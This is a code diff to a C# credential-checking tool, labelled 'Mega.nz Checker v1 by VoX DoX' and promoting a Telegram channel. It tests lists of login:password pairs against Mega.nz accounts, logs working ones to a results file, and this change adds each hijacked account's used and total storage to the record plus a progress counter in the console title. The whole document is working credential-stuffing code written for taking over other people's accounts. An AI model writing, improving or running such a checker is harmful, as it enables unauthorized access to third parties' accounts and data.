@@ -105,19 +105,33 @@ namespace MegaNzChecker
                         try
                         {
                             client.Login(login, password);
-                            if (!client.IsLoggedIn)
+                            if (client.IsLoggedIn)
+                            {
+                                string text = string.Concat(new string[]
+                                {
+                                    "============================================\r\n",
+                                    login,
+                                    ":",
+                                    password,
+                                    Environment.NewLine,
+                                    "Used: ",
+                                    (client.GetAccountInformation().UsedQuota / 1073741824L).ToString(),
+                                    "/",
+                                    (client.GetAccountInformation().TotalQuota / 1073741824L).ToString(),
+                                    "GB"
+                                });
+                                File.AppendAllText("results.txt", text + Environment.NewLine);
+
+                                Logger.Printf("[+] валид " + login + ":" + password, Logger.Type.SUCCESS);
+                                valid++;
+                                Program.updateTitle();
+                            }
+                            else
                             {
                                 Logger.Printf("[-] невалид " + login + ":" + password, Logger.Type.ERROR);
                                 File.AppendAllText("invalid.txt", string.Concat(login, ":", password, Environment.NewLine));
                                 invalid++;
-                            }
-                            else
-                            {
-                                Logger.Printf("[+] валид " + login + ":" + password, Logger.Type.SUCCESS);
-                                File.AppendAllText("results.txt", string.Concat(login, ":", password, Environment.NewLine));
-
-                                valid++;
-                                Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft >> VALID: {0}", valid);
+                                Program.updateTitle();
                             }
                         }
                         catch
@@ -125,8 +139,7 @@ namespace MegaNzChecker
                             Logger.Printf("[-] невалид " + login + ":" + password, Logger.Type.ERROR);
                             File.AppendAllText("invalid.txt", string.Concat(login, ":", password, Environment.NewLine));
                             invalid++;
-
-                            Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft >> VALID: {0}", valid);
+                            Program.updateTitle();
                         }
 
                     }
@@ -142,6 +155,10 @@ namespace MegaNzChecker
             Console.WriteLine("");
             Logger.Printf("Подпишись: https://t.me/End_Soft", Logger.Type.SUCCESS);
             Console.ReadLine();
+        }
+        private static void updateTitle()
+        {
+            Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft >> VALID: {0} | {1}/{2}", valid, valid + invalid, total);
         }
 
         public static int total;
